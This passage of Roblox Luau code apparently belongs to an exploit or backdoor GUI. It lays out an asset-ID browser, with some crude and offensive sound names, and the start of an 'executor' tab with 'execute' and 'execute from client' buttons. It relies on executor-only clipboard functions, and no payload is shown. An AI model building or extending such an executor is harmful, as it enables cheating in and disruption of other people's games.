uwu["asset image name 3"].Position = UDim2.new(0, 93, 0, 186)
uwu["asset image name 3"].BackgroundColor3 = uwu["default background color"]
uwu["asset image name 3"].BorderColor3 = uwu["default border color"]
uwu["asset image name 3"].BorderSizePixel = 1
uwu["asset image name 3"].TextColor3 = uwu["default border color"]
uwu["asset image name 3"].Font = Enum.Font.RobotoMono
uwu["asset image name 3"].TextSize = 15
uwu["asset image name 3"].TextScaled = false
uwu["asset image name 3"].Text = "empty"
uwu["asset image name 3"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image name 3"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image name 3"].Parent = uwu["main frame 1"]
uwu["asset image name 3"].ZIndex = 19
uwu["asset image name 3"].Visible = false
uwu["asset image name 3 text padding"] = Instance.new("UIPadding")
uwu["asset image name 3 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image name 3 text padding"].Parent = uwu["asset image name 3"]

uwu["asset image id 3"].Size = UDim2.new(0, 205, 0, 28)
uwu["asset image id 3"].Position = UDim2.new(0, 93, 0, 218)
uwu["asset image id 3"].BackgroundColor3 = uwu["default background color"]
uwu["asset image id 3"].BorderColor3 = uwu["default border color"]
uwu["asset image id 3"].BorderSizePixel = 1
uwu["asset image id 3"].TextColor3 = uwu["default border color"]
uwu["asset image id 3"].Font = Enum.Font.RobotoMono
uwu["asset image id 3"].TextSize = 15
uwu["asset image id 3"].TextScaled = false
uwu["asset image id 3"].Text = "id: empty"
uwu["asset image id 3"].TextXAlignment = Enum.TextXAlignment.Center
uwu["asset image id 3"].TextYAlignment = Enum.TextYAlignment.Center
uwu["asset image id 3"].Parent = uwu["main frame 1"]
uwu["asset image id 3"].ZIndex = 19
uwu["asset image id 3"].Visible = false
uwu["asset image id 3 text padding"] = Instance.new("UIPadding")
uwu["asset image id 3 text padding"].PaddingTop = UDim.new(0, -2)
uwu["asset image id 3 text padding"].Parent = uwu["asset image id 3"]

uwu["copy asset id 3 button"].Size = UDim2.new(0, 70, 0, 28)
uwu["copy asset id 3 button"].Position = UDim2.new(0, 303, 0, 218)
uwu["copy asset id 3 button"].BackgroundColor3 = uwu["default background color"]
uwu["copy asset id 3 button"].BorderColor3 = uwu["default border color"]
uwu["copy asset id 3 button"].BorderSizePixel = 1
uwu["copy asset id 3 button"].TextColor3 = uwu["default border color"]
uwu["copy asset id 3 button"].Font = Enum.Font.RobotoMono
uwu["copy asset id 3 button"].TextSize = 15
uwu["copy asset id 3 button"].TextScaled = false
uwu["copy asset id 3 button"].Text = "copy id"
uwu["copy asset id 3 button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["copy asset id 3 button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["copy asset id 3 button"].Parent = uwu["main frame 1"]
uwu["copy asset id 3 button"].ZIndex = 19
uwu["copy asset id 3 button"].Visible = false
uwu["copy asset id 3 button text padding"] = Instance.new("UIPadding")
uwu["copy asset id 3 button text padding"].PaddingTop = UDim.new(0, -2)
uwu["copy asset id 3 button text padding"].Parent = uwu["copy asset id 3 button"]

-------------------------------------------------------------------------------------------------------------------------------

uwu["next page 2 button"].Size = UDim2.new(0, 19, 0, 190)
uwu["next page 2 button"].Position = UDim2.new(0, 4, 0, 56)
uwu["next page 2 button"].BackgroundColor3 = uwu["default background color"]
uwu["next page 2 button"].BorderColor3 = uwu["default border color"]
uwu["next page 2 button"].BorderSizePixel = 1
uwu["next page 2 button"].TextColor3 = uwu["default border color"]
uwu["next page 2 button"].Font = Enum.Font.RobotoMono
uwu["next page 2 button"].TextSize = 15
uwu["next page 2 button"].TextScaled = false
uwu["next page 2 button"].Text = "<"
uwu["next page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["next page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["next page 2 button"].Parent = uwu["main frame 1"]
uwu["next page 2 button"].ZIndex = 20
uwu["next page 2 button"].Visible = false
uwu["next page 2 button text padding"] = Instance.new("UIPadding")
uwu["next page 2 button text padding"].PaddingTop = UDim.new(0, -5)
uwu["next page 2 button text padding"].Parent = uwu["next page 2 button"]

uwu["previous page 2 button"].Size = UDim2.new(0, 19, 0, 190)
uwu["previous page 2 button"].Position = UDim2.new(0, 378, 0, 56)
uwu["previous page 2 button"].BackgroundColor3 = uwu["default background color"]
uwu["previous page 2 button"].BorderColor3 = uwu["default border color"]
uwu["previous page 2 button"].BorderSizePixel = 1
uwu["previous page 2 button"].TextColor3 = uwu["default border color"]
uwu["previous page 2 button"].Font = Enum.Font.RobotoMono
uwu["previous page 2 button"].TextSize = 15
uwu["previous page 2 button"].TextScaled = false
uwu["previous page 2 button"].Text = ">"
uwu["previous page 2 button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["previous page 2 button"].TextYAlignment = Enum.TextYAlignment.Center
uwu["previous page 2 button"].Parent = uwu["main frame 1"]
uwu["previous page 2 button"].ZIndex = 20
uwu["previous page 2 button"].Visible = false
uwu["previous page 2 button text padding"] = Instance.new("UIPadding")
uwu["previous page 2 button text padding"].PaddingTop = UDim.new(0, -5)
uwu["previous page 2 button text padding"].Parent = uwu["previous page 2 button"]

local assetData = {
	["image IDs"] = {
		{id = "129909577310669", image = "rbxassetid://129909577310669", name = "team noxious icon"},
		{id = "15960576470", image = "rbxassetid://15960576470", name = "flustered group icon"},
		{id = "18743174443", image = "rbxassetid://18743174443", name = "this thing"},

		{id = "15848332855", image = "rbxassetid://15848332855", name = "scary face 1"},
		{id = "112289855511517", image = "rbxassetid://112289855511517", name = "scary face 2"},
		{id = "15296361385", image = "rbxassetid://15296361385", name = "scary face 3"},

		{id = "6964586710", image = "rbxassetid://6964586710", name = "albert 1"},
		{id = "5279633075", image = "rbxassetid://5279633075", name = "albert 2"},
		{id = "2881590247", image = "rbxassetid://2881590247", name = "albert 3"},

		{id = "158118263", image = "rbxassetid://158118263", name = "c00lkidd"},
		{id = "16432013221", image = "rbxassetid://9422866248", name = "k00pkidd"},
		{id = "17315237983", image = "rbxassetid://17315237983", name = "tubers93"},

		{id = "82967466186087", image = "rbxassetid://82967466186087", name = "unable 1"},
		{id = "131018743284620", image = "rbxassetid://131018743284620", name = "unable 2"},
		{id = "92724155258384", image = "rbxassetid://92724155258384", name = "unable 3"},

		{id = "10658141259", image = "rbxassetid://10658141259", name = "cat 1"},
		{id = "18940114328", image = "rbxassetid://18940114328", name = "cat 2"},
		{id = "18250553522", image = "rbxassetid://18250553522", name = "cat 3"},

		{id = "18597845968", image = "rbxassetid://18597845968", name = "dog 1"},
		{id = "15090485132", image = "rbxassetid://15090485132", name = "dog 2"},
		{id = "13351233318", image = "rbxassetid://13351233318", name = "dog 3"},

		{id = "17673617362", image = "rbxassetid://17673617362", name = "untextured 1"},
		{id = "18293870483", image = "rbxassetid://18293870483", name = "untextured 2"},
		{id = "7072801754", image = "rbxassetid://7072801754", name = "untextured 3"},

		{id = "17601760499", image = "rbxassetid://17601760499", name = "roblox administrator badge"},
		{id = "7866786419", image = "rbxassetid://7866786419", name = "roblox shutdown"},
		{id = "15642855997", image = "rbxassetid://15642855997", name = "dark stretched static"},

		{id = "11458001755", image = "rbxassetid://11458001755", name = "ishowspeed 1"},
		{id = "11428716493", image = "rbxassetid://11428716493", name = "ishowspeed 2"},
		{id = "13027852586", image = "rbxassetid://13027852586", name = "ishowspeed 3"},

		{id = "13839982198", image = "rbxassetid://13839982198", name = "kreekcraft 1"},
		{id = "14207103524", image = "rbxassetid://14207103524", name = "kreekcraft 2"},
		{id = "12030892645", image = "rbxassetid://12030892645", name = "kreekcraft 3"},

		{id = "85312612489831", image = "rbxassetid://85312612489831", name = "shedletsky"},
		{id = "172423468", image = "rbxassetid://172423468", name = "shedletsky 2"},
		{id = "3359602672", image = "rbxassetid://3359602672", name = "shedletsky 3"},

		{id = "131178173049173", image = "rbxassetid://131178173049173", name = "10000x10000 test"},
		{id = "89442759973598", image = "rbxassetid://89442759973598", name = "20000x20000 test"},
		{id = "82751535106374", image = "rbxassetid://82751535106374", name = "30000x30000 test"},
	},
	["sound IDs"] = {
		{id = "76578817848504", name = "jumpstyle"},
		{id = "1839247124", name = "jumpstyle 2"},
		{id = "1839246711", name = "jumpstyle 2 (extended)"},

		{id = "688596285", name = "man crying"},
		{id = "7014161416", name = "woman crying"},
		{id = "7046088029", name = "robot rock loop"},

		{id = "16190757458", name = "skibidi fanum tax"},
		{id = "2847278264727", name = "#brooklynbloodpop! - syko (external)"},
		{id = "194747292744928", name = "hypnosaes espectral 2 remix - dj gr11 / dj igeeks (external)"},

		{id = "7999878400", name = "phonk 1"},
		{id = "7601924770", name = "phonk 2"},
		{id = "7764635032", name = "phonk 3"},

		{id = "1947282747182747", name = "lovely bastards funk - dj vttt77 (external)"},
		{id = "1636291836383658", name = "onlyfans - bibi babydoll (external)"},
		{id = "193648262648483626", name = "montagem felicidade expressiva (slowed) (external)"},

		{id = "5672354144", name = "packing"},
		{id = "132760245482684", name = "you diggin in me"},
		{id = "111281710445018", name = "palm tree funk"},

		{id = "8031609997", name = "pornhub intro"},
		{id = "5854877338", name = "want a break from the ads?"},
		{id = "8119768185", name = "bing chilling"},

		{id = "9059013830", name = "why this game so fun chat"},
		{id = "9074555470", name = "they need to die"},
		{id = "9059015332", name = "man what the f"},

		{id = "5228173823", name = "gangsta paradise loop remix"},
		{id = "3200130016", name = "you are an idiot"},
		{id = "4809574295", name = "fart"},

		{id = "85833437298815", name = "smezir (slowed)"},
		{id = "73154534382655", name = "lieu - drain"},
		{id = "104458998006537", name = "sesame street beat"},

		{id = "133898039428349", name = "who made that mess"},
		{id = "81044979151859", name = "burger king plane incident"},
		{id = "98238687813546", name = "teach me"},

		{id = "192746282847987", name = "foreign - vampviolence (external)"},
		{id = "1937472828744", name = "fenix ritmada - dj ryan no beat (external)"},
		{id = "2481818374839183", name = "nova - krezus (external)"},

		{id = "1937462828462817367", name = "ela joga na hora (slowed) (external)"},
		{id = "194728264781726473", name = "baile de coquiero 7 (external)"},
		{id = "1947472828477282", name = "montagem voltar (external)"},

		{id = "128900322878891", name = "drillbeat"},
		{id = "86471321003271", name = "hardstyle with static"},
		{id = "79744099014827", name = "foreign with static"},

		{id = "388272473827264", name = "trablabla - wxchsxn (external)"},
		{id = "1948276163758582", name = "grow a garden funk (external)"},
		{id = "04440404404040440", name = "reality - axius link (external)"},

		{id = "88723844725910", name = "cooking with kya"},
		{id = "18462937481827373", name = "crow song - sanguinarius (external)"},
		{id = "125865426218084", name = "call me a good boy"},

		{id = "111092240241909", name = "hard ass jumpstyle"},
		{id = "21937418364728284", name = "funk bad do bad - dj vttt77 (external)"},
		{id = "18841896412", name = "hardstyle"},

		{id = "133828158357528", name = "foreign - lungskull"},
		{id = "88064647826500", name = "congo funk"},
		{id = "117764575764380", name = "people who annoy you"},

		{id = "85911347599135", name = "twice n word"},
		{id = "123619245101939", name = "its going down now"},
		{id = "1737483827468439", name = "you are pressed!! - lieu (external)"},

		{id = "183646282846472", name = "rune of september (external)"},
		{id = "96762704171712", name = "snickers"},
		{id = "117562011395992", name = "brazilian funk"},

		{id = "78527071535561", name = "!? - lungskull instrumental"},
		{id = "86412047196482", name = "toxic - d3r & 6arelyhuman"},
		{id = "98731775607694", name = "skibidi dop dop dop yes yes"},

		{id = "91922658560009", name = "bodypartz instrumental"},
		{id = "18841888868", name = "love bomb - d3r"},
		{id = "2351874728164", name = "funk do elevator (external)"},

		{id = "19374822837282737", name = "piano tiles - armani west (external)"},
		{id = "79494113906358", name = "toby smiles"},
		{id = "118898127559047", name = "WHO IS GOD!?!?!"},

		{id = "90124981325233", name = "clapping noises???"},
		{id = "10374729384729", name = "montagem succao neural - dj zenite (external)"},
		{id = "94356638905764", name = "ambasing"},

		{id = "18599504383", name = "bumpin that"},
		{id = "138478944413457", name = "met you party"},
		{id = "110472251959955", name = "eviljordan"},

		{id = "135844480028738", name = "king owns"},
		{id = "91256110982700", name = "till you use your mind"},
		{id = "106130561648076", name = "listen listen listen"},

		{id = "107537681782154", name = "stretchin"},
		{id = "75069501268805", name = "gimme that dih"},
		{id = "400004444044044", name = "wutiwant - saraunh0ly (external)"},

		{id = "104387056593435", name = "its getting harder"},
		{id = "103232206651699", name = "gargling???"},
		{id = "94104195286244", name = "kiss of life"},

		{id = "99468240251510", name = "rupert gaming war cry"},
		{id = "118730057421267", name = "trench boy"},
		{id = "104789232753644", name = "forgot the name"},

		{id = "9774647115329", name = "comet"},
		{id = "124176387786425", name = "teach me full"},
		{id = "18246618364758572", name = "АсТuГmАтNзМ.. - av3rn1x (external)"},

		{id = "130262136847701", name = "chicken jockey"},
		{id = "1249827348923757", name = "am i overreacting - hkmori (external)"},
		{id = "134713831368801", name = "god bless you with mountains of silver and gold"},

		{id = "77227669080312", name = "victor dice a joel reggatone version"},
		{id = "912995590639144", name = "angel jumpstyle"},
		{id = "3727154382186353", name = "fragment - slxghter (slowed) (external)"},

		{id = "77567474947048", name = "com medo or some shit idk"},
		{id = "86399734003731", name = "luna bala"},
		{id = "198748194766299", name = "loli - 5ewmet (external)"},

		{id = "957262475728274", name = "im not that innocent instrumental - block 13 (external)"},
		{id = "115563204163268", name = "better off dead"},
		{id = "90364828543378", name = "late - lieu"},

		{id = "123444559489023", name = "cant restart"},
		{id = "97841988407875", name = "munchausen syndrome hardstyle remix"},
		{id = "95038464868319", name = "tayo belli"},

		{id = "96108973029378", name = "cuh"},
		{id = "86127169849996", name = "lady hear me tonight"},
		{id = "93599174452421", name = "around the school"},

		{id = "102216494740042", name = "gangsters"},
		{id = "29474729374792", name = "montagem lunar rally (slowed) (external)"},
		{id = "193462927464828", name = "krug - dj stonik 1917 (external)"},

		{id = "196634818253957", name = "vanished - crystal castles (external)"},
		{id = "1837471837748471", name = "montagem renicht inesperado (external)"},
		{id = "18364627264728", name = "taca xe - dj tls da zl (external)"},

		{id = "1129483289284747", name = "headlock 1shot jersey remix (external)"},
		{id = "1846418173638182", name = "no hands - waka flocka (external)"},
		{id = "1538163717465828", name = "taco - cblu (external)"},

		{id = "193747197374837164", name = "bas bas kotakbas funk (slowed) (external)"},
		{id = "19374728438288577", name = "clima lindo (slowed) (external)"},
		{id = "194728274626264857", name = "automotivo angelical v4 - dj zk3 (external)"},

		{id = "104846670980072", name = "want to love"},
		{id = "18462827466282645", name = "automotivo rally celestial (external)"},
		{id = "19472625184582173", name = "hunniddolla (external)"},

		{id = "18367181637284636", name = "montagem mexilo estranho jumpstyle version (external)"},
		{id = "18367264627385726", name = "estrela helix (slowed) (external)"},
		{id = "184738292625371357", name = "hypnosaes espectral 2 (slowed) (external)"},

		{id = "194738173649281648", name = "dont hide - so supa (external)"},
		{id = "19273467227737474", name = "montagem do hypnosaes 3 (slowed) (external)"},
		{id = "102846817375927", name = "hazy moon jumpstyle (external)"},
	},
	["gear IDs"] = {
		{id = "16726030", name = "cheeseburger"},
		{id = "13745494", name = "turkey leg"},
		{id = "16214845", name = "cake"},

		{id = "16722267", name = "moneybag"},
		{id = "78730532", name = "body swap potion"},
		{id = "80576967", name = "spray paint"},

		{id = "225921000", name = "rainbow carpet"},
		{id = "99119158", name = "speed coil"},
		{id = "16688968", name = "gravity coil"},

		{id = "10472779", name = "bloxy cola"},
		{id = "10727852", name = "witches brew"},
		{id = "21392199", name = "chocolate milk"},

		{id = "15177716", name = "taco"},
		{id = "12848902", name = "teddy bloxpin"},
		{id = "113328094", name = "lightblox jar"},

		{id = "11563251", name = "fuse bomb"},
		{id = "11450664", name = "slateskin potion"},
		{id = "11419319", name = "healing potion"},

		{id = "120307951", name = "noir periastron psi"},
		{id = "108158379", name = "ivory periastron"},
		{id = "80597060", name = "fake chartreuse periastron gamma"},

		{id = "233520257", name = "joyful periastron epsilon"},
		{id = "73829193", name = "grimgold periastron beta"},
		{id = "2544549379", name = "fall periastron xi"},

		{id = "159229806", name = "rainbow periastron omega"},
		{id = "99119240", name = "crimson periastron mu"},
		{id = "69499437", name = "azure periastron alpha"},

		{id = "80661504", name = "chartreuse periastron gamma"},
		{id = "139577901", name = "festive periastron chi"},
		{id = "93136802", name = "amethyst periastron kappa"},

		{id = "97885508", name = "the general's .45"},
		{id = "116693764", name = "historic timmy gun"},
		{id = "34870758", name = "wormhole tunneler"},

		{id = "130113146", name = "hyperlaser gun"},
		{id = "212296936", name = "red hyperlaser gun"},
		{id = "1427401206", name = "green hyperlaser gun"},

		{id = "94233344", name = "shotgun"},
		{id = "33879504", name = "flamethrower"},
		{id = "11999247", name = "subspace tripmine"},
	}
}

local maxDisplayChars = 35
local scrollSpeed = 5
local pauseDuration = 1
local scrollControllers = {}

for i = 1, 3 do
	scrollControllers[i] = {
		fullText = "",
		displayText = "",
		scrollPosition = 1,
		timer = 0,
		state = "paused", -- paused, forward, backward
		needsScroll = false
	}
end

local function updateScrollingText(dt)
	for i = 1, 3 do
		local controller = scrollControllers[i]

		if not controller.needsScroll then continue end

		controller.timer = controller.timer + dt

		if controller.state == "paused" then
			if controller.timer >= pauseDuration then
				controller.timer = 0
				if controller.scrollPosition == 1 then
					controller.state = "forward"
				else
					controller.state = "backward"
				end
			end
		elseif controller.state == "forward" then
			controller.scrollPosition = math.min(
				controller.scrollPosition + scrollSpeed * dt,
				#controller.fullText - maxDisplayChars + 1
			)

			if controller.scrollPosition >= #controller.fullText - maxDisplayChars + 1 then
				controller.state = "paused"
				controller.timer = 0
			end

			controller.displayText = string.sub(
				controller.fullText,
				math.floor(controller.scrollPosition),
				math.floor(controller.scrollPosition) + maxDisplayChars - 1
			)
			uwu["asset image name " .. i].Text = controller.displayText

		elseif controller.state == "backward" then
			controller.scrollPosition = math.max(
				controller.scrollPosition - scrollSpeed * dt,
				1
			)

			if controller.scrollPosition <= 1 then
				controller.state = "paused"
				controller.timer = 0
			end

			controller.displayText = string.sub(
				controller.fullText,
				math.floor(controller.scrollPosition),
				math.floor(controller.scrollPosition) + maxDisplayChars - 1
			)
			uwu["asset image name " .. i].Text = controller.displayText
		end
	end
end

if not scrollingConnection then
	scrollingConnection = game:GetService("RunService").RenderStepped:Connect(updateScrollingText)
end

local originalAssetData = {
	["image IDs"] = {},
	["sound IDs"] = {},
	["gear IDs"] = {}
}

for category, assets in pairs(assetData) do
	for _, asset in ipairs(assets) do
		table.insert(originalAssetData[category], table.clone(asset))
	end
end

local isSearching = false
local currentSearchResults = {}

function searchAssets(searchTerm)
	searchTerm = string.lower(searchTerm)
	if searchTerm == "" then
		isSearching = false
		assetData[assetIdPages[currentAssetIdPageIndex]] = originalAssetData[assetIdPages[currentAssetIdPageIndex]]
		currentpg = 1
		updatePage()
		return
	end

	isSearching = true
	currentSearchResults = {}

	local assetType = assetIdPages[currentAssetIdPageIndex]
	for _, asset in pairs(originalAssetData[assetType]) do
		if string.find(string.lower(asset.name), searchTerm, 1, true) then
			table.insert(currentSearchResults, table.clone(asset))
		end
	end

	assetData[assetType] = currentSearchResults
	currentpg = 1
	updatePage()
end

savedAssetIdPageIndex = 1

assetIdPages = {"image IDs", "sound IDs", "gear IDs"}
currentAssetIdPageIndex = 1
currentpg = 1
assetsPerPage = 3

function updateAssetIdTypeIndicator()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	uwu["asset id type indicator"].Text = assetType .. " [page " .. currentpg .. "/" .. totalpgs .. "]"
end

function updatePage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local assets = assetData[assetType]
	local totalpgs = math.ceil(#assets / assetsPerPage)

	uwu["asset id type indicator"].Text = assetType .. " [page " .. currentpg .. "/" .. totalpgs .. "]"

	for i = 1, assetsPerPage do
		local assetIndex = (currentpg - 1) * assetsPerPage + i
		local asset = assets[assetIndex]
		local controller = scrollControllers[i]

		if asset then
			if assetType == "sound IDs" then
				uwu["asset image " .. i].Image = "rbxassetid://110126477790022"
				uwu["asset image " .. i].ImageColor3 = uwu["default text color"]
			elseif assetType == "gear IDs" then
				uwu["asset image " .. i].Image = "https://www.roblox.com/Thumbs/Asset.ashx?width=420&height=420&assetId=" .. asset.id
				uwu["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			else
				uwu["asset image " .. i].Image = asset.image or "rbxassetid://0"
				uwu["asset image " .. i].ImageColor3 = Color3.new(1, 1, 1)
			end

			controller.fullText = asset.name or "empty"
			controller.needsScroll = #controller.fullText > maxDisplayChars

			if controller.needsScroll then
				controller.scrollPosition = 1
				controller.timer = 0
				controller.state = "paused"
				controller.displayText = string.sub(controller.fullText, 1, maxDisplayChars)
			else
				controller.displayText = controller.fullText
			end

			uwu["asset image name " .. i].Text = controller.displayText
			uwu["asset image id " .. i].Text = "id: " .. (asset.id or "empty")

			uwu["copy asset id " .. i .. " button"].Name = ""
			uwu["asset image id " .. i].Name = ""
			uwu["asset image name " .. i].Name = ""
			uwu["asset image " .. i].Name = ""

			uwu["asset image " .. i].BorderColor3 = uwu["default border color"]
			uwu["asset image name " .. i].BorderColor3 = uwu["default border color"]
			uwu["asset image name " .. i].TextColor3 = uwu["default text color"]
			uwu["asset image id " .. i].BorderColor3 = uwu["default border color"]
			uwu["asset image id " .. i].TextColor3 = uwu["default text color"]
			uwu["copy asset id " .. i .. " button"].Text = "copy id"
			uwu["copy asset id " .. i .. " button"].BorderColor3 = uwu["default border color"]
			uwu["copy asset id " .. i .. " button"].TextColor3 = uwu["default text color"]
		else
			uwu["asset image " .. i].Image = "rbxassetid://0"
			uwu["asset image " .. i].BorderColor3 = uwu["default 1/2 color 2"]
			uwu["asset image " .. i].Name = "epicob"
			uwu["asset image name " .. i].Text = "-"
			uwu["asset image name " .. i].BorderColor3 = uwu["default 1/2 color 2"]
			uwu["asset image name " .. i].TextColor3 = uwu["default 1/2 color"]
			uwu["asset image name " .. i].Name = "epico"
			uwu["asset image id " .. i].Text = "-"
			uwu["asset image id " .. i].BorderColor3 = uwu["default 1/2 color 2"]
			uwu["asset image id " .. i].TextColor3 = uwu["default 1/2 color"]
			uwu["asset image id " .. i].Name = "epico"
			uwu["copy asset id " .. i .. " button"].Text = "-"
			uwu["copy asset id " .. i .. " button"].BorderColor3 = uwu["default 1/2 color 2"]
			uwu["copy asset id " .. i .. " button"].TextColor3 = uwu["default 1/2 color"]
			uwu["copy asset id " .. i .. " button"].Name = "epico"
			controller.fullText = "empty"
			controller.displayText = "empty"
			controller.needsScroll = false
		end
	end
end

function nextPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg + 1
	if currentpg > totalpgs then
		currentpg = 1
	end
	updatePage()
end

function previousPage()
	local assetType = assetIdPages[currentAssetIdPageIndex]
	local totalpgs = math.ceil(#assetData[assetType] / assetsPerPage)
	currentpg = currentpg - 1
	if currentpg < 1 then
		currentpg = totalpgs
	end
	updatePage()
end

function nextAssetType()
	local currentType = assetIdPages[currentAssetIdPageIndex]
	if isSearching then
		assetData[currentType] = originalAssetData[currentType]
	end

	currentAssetIdPageIndex = currentAssetIdPageIndex % #assetIdPages + 1
	currentpg = 1
	isSearching = false

	uwu["asset id search bar"].Text = ""
	updatePage()
end

function previousAssetType()
	local currentType = assetIdPages[currentAssetIdPageIndex]
	if isSearching then
		assetData[currentType] = originalAssetData[currentType]
	end

	currentAssetIdPageIndex = (currentAssetIdPageIndex - 2) % #assetIdPages + 1
	currentpg = 1
	isSearching = false

	uwu["asset id search bar"].Text = ""
	updatePage()
end

uwu["asset id search bar"].Changed:Connect(function(property)
	if property == "Text" then
		local searchTerm = uwu["asset id search bar"].Text
		searchAssets(searchTerm)
	end
end)

uwu["switch asset id type button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

uwu["switch asset id type button 2"].MouseButton1Click:Connect(function()
	playclicksound()
	nextAssetType()
	savedAssetIdPageIndex = currentAssetIdPageIndex
end)

uwu["previous page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	nextPage()
end)

uwu["next page 2 button"].MouseButton1Click:Connect(function()
	playclicksound()
	previousPage()
end)

local everyClipboard = setclipboard or toclipboard or set_clipboard or (Clipboard and Clipboard.set)

function toClipboard(txt)
	if everyClipboard then
		everyClipboard(tostring(txt))
		unablenotify("copied to clipboard.")
	else
		unablenotify("unable to access clipboard.")
	end
end

function copyAssetId(assetId)
	toClipboard(assetId)
end

for i = 1, 3 do
	local copyButton = uwu["copy asset id " .. i .. " button"]
	local assetIdLabel = uwu["asset image id " .. i]

	copyButton.MouseButton1Click:Connect(function()
		spawn(function() if copyButton.Text == "-" then return end playclicksound() end)
		local assetIdText = assetIdLabel.Text
		local assetId = assetIdText:match("%d+")
		if assetId then
			copyAssetId(assetId)
		end
	end)
end

updatePage()

-------------------------------------------------------------------------------------------------------------------------------

uwu["executor tab"].Size = UDim2.new(0, 100, 0, 26)
uwu["executor tab"].Position = UDim2.new(0, 301, 0, 1)

uwu["executor tab"].BackgroundColor3 = uwu["default background color"]

uwu["executor tab"].BorderColor3 = uwu["default border color"]
uwu["executor tab"].BorderSizePixel = 1

uwu["executor tab"].TextColor3 = uwu["default border color"]
uwu["executor tab"].Font = Enum.Font.RobotoMono
uwu["executor tab"].TextSize = 15
uwu["executor tab"].TextScaled = false
uwu["executor tab"].Text = "executor"
uwu["executor tab"].TextXAlignment = Enum.TextXAlignment.Center
uwu["executor tab"].TextYAlignment = Enum.TextYAlignment.Center

uwu["executor tab text padding"] = Instance.new("UIPadding")
uwu["executor tab text padding"].PaddingLeft = UDim.new(0, 0)
uwu["executor tab text padding"].Parent = uwu["executor tab"]

uwu["executor tab"].Parent = uwu["main frame 1"]
uwu["executor tab"].ZIndex = 19

uwu["executor tab bottom cover"].Size = UDim2.new(0, 100, 0, 2)
uwu["executor tab bottom cover"].Position = UDim2.new(0, 301, 0, 27)
uwu["executor tab bottom cover"].BackgroundColor3 = uwu["default background color"]
uwu["executor tab bottom cover"].BorderSizePixel = 0
uwu["executor tab bottom cover"].Parent = uwu["main frame 1"]
uwu["executor tab bottom cover"].ZIndex = 19.5
uwu["executor tab bottom cover"].Visible = false

-------------------------------------------------------------------------------------------------------------------------------

uwu["executor scrolling frame"].Size = UDim2.new(0, 393, 0, 164)
uwu["executor scrolling frame"].Position = UDim2.new(0, 4, 0, 32)
uwu["executor scrolling frame"].BackgroundColor3 = uwu["default background color"]
uwu["executor scrolling frame"].BorderColor3 = uwu["default border color"]
uwu["executor scrolling frame"].BorderSizePixel = 1
uwu["executor scrolling frame"].ScrollBarThickness = 8
uwu["executor scrolling frame"].ScrollBarImageColor3 = uwu["default 1/2 color"]
uwu["executor scrolling frame"].CanvasSize = UDim2.new(0, 0, 0, 0)
uwu["executor scrolling frame"].Parent = uwu["main frame 1"]
uwu["executor scrolling frame"].ZIndex = 19
uwu["executor scrolling frame"].Visible = false
uwu["executor scrolling frame"].ScrollingDirection = Enum.ScrollingDirection.XY

uwu["executor textbox"].Size = UDim2.new(0, 393, 0, 164)
uwu["executor textbox"].Position = UDim2.new(0, 0, 0, 0)
uwu["executor textbox"].BackgroundColor3 = uwu["default background color"]
uwu["executor textbox"].BorderColor3 = uwu["default border color"]
uwu["executor textbox"].BorderSizePixel = 0
uwu["executor textbox"].TextColor3 = uwu["default border color"]
uwu["executor textbox"].PlaceholderText = "paste script here"
uwu["executor textbox"].PlaceholderColor3 = uwu["default 1/2 color"]
uwu["executor textbox"].Font = Enum.Font.RobotoMono
uwu["executor textbox"].TextSize = 15
uwu["executor textbox"].TextScaled = false
uwu["executor textbox"].Text = "print(\"goodbye world!\")"
uwu["executor textbox"].TextXAlignment = Enum.TextXAlignment.Left
uwu["executor textbox"].TextYAlignment = Enum.TextYAlignment.Top
uwu["executor textbox"].ClearTextOnFocus = false
uwu["executor textbox"].MultiLine = true
uwu["executor textbox"].Parent = uwu["executor scrolling frame"]
uwu["executor textbox"].ZIndex = 20

uwu["executor textbox text padding"] = Instance.new("UIPadding")
uwu["executor textbox text padding"].PaddingLeft = UDim.new(0, 4)
uwu["executor textbox text padding"].PaddingTop = UDim.new(0, 4)
uwu["executor textbox text padding"].PaddingBottom = UDim.new(0, 4)
uwu["executor textbox text padding"].Parent = uwu["executor scrolling frame"]

function updateCanvas()
	local textBounds = uwu["executor textbox"].TextBounds
	uwu["executor textbox"].Size = UDim2.new(0, math.max(392, textBounds.X + 20), 0, math.max(164, textBounds.Y + 20))
	uwu["executor scrolling frame"].CanvasSize = UDim2.new(0, textBounds.X + 20, 0, textBounds.Y + 11)
end

uwu["executor textbox"]:GetPropertyChangedSignal("Text"):Connect(updateCanvas)

spawn(updateCanvas)

uwu["execute button"].Size = UDim2.new(0, 158, 0, 45)
uwu["execute button"].Position = UDim2.new(0, 4, 0, 201)

uwu["execute button"].BackgroundColor3 = uwu["default background color"]

uwu["execute button"].BorderColor3 = uwu["default border color"]
uwu["execute button"].BorderSizePixel = 1

uwu["execute button"].TextColor3 = uwu["default border color"]
uwu["execute button"].Font = Enum.Font.RobotoMono
uwu["execute button"].TextSize = 15
uwu["execute button"].TextScaled = false
uwu["execute button"].Text = "execute"
uwu["execute button"].TextXAlignment = Enum.TextXAlignment.Center
uwu["execute button"].TextYAlignment = Enum.TextYAlignment.Center

uwu["execute button text padding"] = Instance.new("UIPadding")
uwu["execute button text padding"].PaddingLeft = UDim.new(0, 0)
uwu["execute button text padding"].Parent = uwu["execute button"]

uwu["execute button"].Parent = uwu["main frame 1"]
uwu["execute button"].ZIndex = 19
uwu["execute button"].Visible = false

uwu["execute from client button"].Size = UDim2.new(0, 158, 0, 45)
uwu["execute from client button"].Position = UDim2.new(0, 167, 0, 201)

uwu["execute from client button"].BackgroundColor3 = uwu["default background color"]

